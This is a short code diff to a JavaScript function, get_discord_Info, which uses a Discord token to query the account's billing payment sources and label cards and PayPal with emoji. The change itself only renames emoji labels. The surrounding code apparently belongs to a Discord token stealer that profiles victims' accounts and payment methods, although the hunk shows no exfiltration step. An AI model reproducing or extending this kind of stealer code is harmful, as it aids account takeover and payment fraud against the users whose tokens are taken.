@@ -234,8 +234,8 @@ const get_discord_Info = async (token) => {
             
             billing = await request("/v9/users/@me/billing/payment-sources", token);
             billing = billing?.reduce((a, e) => {
-                if (e.brand && !e.invalid) a += "<a:_:1083014677430284358> ";
-                if (e.email) a += "<:_:1129073151746252870> ";
+                if (e.brand && !e.invalid) a += "<a:card:1083014677430284358> ";
+                if (e.email) a += "<:paypal:1129073151746252870> ";
                 return a;
             }, '') || 'Billing not found';
             
